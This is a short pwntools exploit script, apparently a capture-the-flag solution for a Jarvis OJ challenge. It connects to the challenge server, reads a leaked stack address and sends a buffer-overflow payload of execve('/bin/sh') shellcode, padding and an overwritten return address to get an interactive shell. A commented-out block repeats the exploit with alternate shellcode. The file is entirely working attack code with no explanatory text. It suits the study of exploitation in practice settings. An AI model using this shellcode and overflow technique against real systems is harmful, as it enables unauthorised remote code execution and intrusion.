from pwn import *

sh = remote('pwn2.jarvisoj.com', 9877)
s = sh.readline()
padding = 0x88+4
shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"
addr = p32(int(s[len("What's this:"):-2],16))
ex = shellcode + 'A'*(padding-len(shellcode))+addr
sh.write(ex)
sh.interactive()


# sh = process('./level1')  # local
# sh = remote('pwn2.jarvisoj.com', 9877)  # remote
# sh.recvuntil(':')
# address = sh.recvuntil('?', drop=True)
# address = int(address, 16)
# print address
# junk = 'a' * 0x88
# fakeebp = 'aaaa' # fakeebp
# retaddr = address + 0x88 + 4 + 4
# shellcode = "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f"     "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0"     "\x0b\xcd\x80\n"
# payload = junk + fakeebp + p32(retaddr) + shellcode
# sh.send(payload)
# sh.interactive()